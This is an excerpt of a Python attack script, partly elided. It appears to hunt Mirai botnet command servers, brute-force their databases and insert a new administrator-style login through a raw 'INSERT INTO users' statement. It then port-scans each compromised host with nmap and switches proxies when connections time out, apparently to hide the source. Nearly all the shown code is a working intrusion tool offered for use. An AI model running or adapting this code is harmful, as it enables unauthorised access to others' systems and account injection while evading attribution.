...
def portscan(ip):
        ...
        while True:
           try:
               ...
               ports = nmap_scanner[ip]['tcp'].keys()
               for port in ports:
                   result = {}
                   state = nmap_scanner[ip]['tcp'][port]['state']
                   service = nmap_scanner[ip]['tcp'][port]['name']
                   result['port'] = port
                   result['state'] = state
                   result['service'] = service
                   if state == 'open':
                     print(f"\033[38;2;255;95;255m{port} \033[38;5;99m| \033[38;2;255;95;255m{state} \033[38;5;99m| \033[38;2;255;95;255m{service}")
               state = 'scanned'
               break
           except:
              print(f"\033[38;2;255;95;255m[\033[38;5;99m{proxyip}\033[38;2;255;95;255m] \033[38;2;225;0;0mTimed Out, Switching Server...")
              getproxies()
           pass
                    ...
                    for a_dict in cursor.fetchall():
                        for db in a_dict:
                            try:
                                ...
                                print(f"\033[96mAttemping To Inject New Login Into Database: \033[93m{a_dict[db]} ")
                                cursor.execute(f"INSERT INTO users VALUES (NULL, '{adduser}', '{addpass}', 0, 0, 0, 0, -1, 1, 30, '');")
                                print(f"\033[38;2;0;255;152mInjected Login Into Database: \033[93m{a_dict[db]} ")
                                print(f"\033[38;2;0;255;152mSuccess \033[38;2;105;145;235mOn \033[38;2;255;95;255m[\033[93m{ip}\033[38;2;255;95;255m] | \033[96mUSER: \033[38;2;255;95;255m\033[38;5;197m{adduser}\033[38;2;255;95;255m | \033[96mPASSWORD: \033[38;2;255;95;255m\033[38;5;197m{addpass}\033[38;2;255;95;255m")
                                portscan(ip)
                                print("")
                                return
                            except:
    ...
    while True:
        try:        
           ...
           for line in res.text.split('\n'):
            ...
            brute(ip, adduser, addpass)
        except KeyboardInterrupt:
            print(f"\033[38;2;255;95;255m[\033[0;93m{mirais}\033[38;2;255;95;255m] \033[38;5;99mMirai's Found Out Of\033[38;2;255;95;255m[\033[0;93m{ipsfound}\033[38;2;255;95;255m]\033[38;5;99mServers")
            break
        except:
           print(f"\033[38;2;255;95;255m[\033[38;5;99m{proxyip}\033[38;2;255;95;255m] \033[38;2;225;0;0mTimed Out, Switching Server...")
           getproxies()
